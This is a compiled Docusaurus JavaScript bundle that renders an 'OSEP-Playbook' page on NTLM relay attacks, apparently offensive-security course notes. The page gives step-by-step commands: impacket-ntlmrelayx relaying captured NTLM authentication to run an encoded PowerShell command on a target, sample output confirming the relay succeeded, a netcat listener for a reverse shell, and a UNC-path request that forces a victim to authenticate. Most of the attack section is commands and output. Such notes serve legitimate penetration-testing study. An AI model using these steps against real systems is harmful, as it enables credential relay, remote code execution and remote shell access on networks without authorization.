"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[3488],{6094(e,t,n){n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"osep/Credentials/Relay Attacks","title":"Relay Attacks","description":"Relay Attacks","source":"@site/docs/osep/Credentials/Relay Attacks.md","sourceDirName":"osep/Credentials","slug":"/osep/Credentials/Relay Attacks","permalink":"/OSEP-Playbook/docs/osep/Credentials/Relay Attacks","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Pass-The-Hash","permalink":"/OSEP-Playbook/docs/osep/Credentials/Pass-The-Hash"},"next":{"title":"Spray Credentials","permalink":"/OSEP-Playbook/docs/osep/Credentials/Spray Credentials"}}');var r=n(4848),o=n(8453);const a={},i=void 0,c={},l=[{value:"<strong>Relay Attacks</strong>",id:"relay-attacks",level:3}];function d(e){const t={code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(t.h3,{id:"relay-attacks",children:(0,r.jsx)(t.strong,{children:"Relay Attacks"})}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(t.ol,{children:["\n",(0,r.jsxs)(t.li,{children:[(0,r.jsxs)(t.strong,{children:["Start Impacket\xa0",(0,r.jsx)(t.code,{children:"ntlmrelayx"})]}),": use the Impacket\xa0",(0,r.jsx)(t.code,{children:"ntlmrelayx"}),"\xa0tool to capture NTLMv2 requests and relay them to a target. Replace\xa0",(0,r.jsx)(t.code,{children:"<target_ip>"}),"\xa0with the IP address of the machine where you want to execute the command. The reverse shell command is optional."]}),"\n"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:'impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"\n\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n[*] Protocol Client SMB loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up WCF Server\n[*] Setting up RAW Server on port 6666\n\n[*] Servers started, waiting for connections\n\n'})}),"\n",(0,r.jsxs)(t.ol,{children:["\n",(0,r.jsxs)(t.li,{children:[(0,r.jsx)(t.strong,{children:"Expected Output After Victim Request"}),": once the victim makes a request, you should see output like this indicating that the relay was successful and the command was executed on the target:"]}),"\n"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"[*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>\n[*] Authenticating against smb://<target_ip> as <domain>/<username> SUCCEED\n[*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!\n...\n[*] Executed specified command on host: <target_ip>\n\n"})}),"\n",(0,r.jsxs)(t.ol,{children:["\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.strong,{children:"Setup Netcat Listener"})}),"\n"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"# The port should match the port specified in the reverse shell command\nnc -nvlp [port]\n\n"})}),"\n",(0,r.jsxs)(t.ol,{children:["\n",(0,r.jsxs)(t.li,{children:[(0,r.jsx)(t.strong,{children:"Force Victim Request (Example)"}),"\xa0Trigger the victim machine to make a request to the Responder server, which can be done through various means such as Remote Code Execution (RCE) in a web application:"]}),"\n"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-powershell",children:"# <responder_ip>: IP address of the machine running the Responder server.\nC:\\Windows\\system32> dir \\\\<responder_ip>\\test\n\n"})})]})}function h(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453(e,t,n){n.d(t,{R:()=>a,x:()=>i});var s=n(6540);const r={},o=s.createContext(r);function a(e){const t=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function i(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(o.Provider,{value:t},e.children)}}}]);